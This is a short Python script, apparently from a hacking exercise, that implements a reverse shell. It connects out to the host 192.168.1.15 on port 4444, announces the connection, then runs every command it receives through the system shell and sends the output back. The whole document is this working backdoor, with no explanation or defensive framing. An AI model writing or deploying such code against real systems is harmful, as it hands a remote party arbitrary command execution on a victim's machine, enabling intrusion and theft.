import socket
import subprocess

def execute_command(command):
    return subprocess.check_output(command, shell = True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.1.15", 4444))

connection.send("\n[+] Connection Established. \n")
while True:
    recievedData = connection.recv(1024)
    executedResult = execute_command(recievedData)
    connection.send(executedResult)

connection.close()
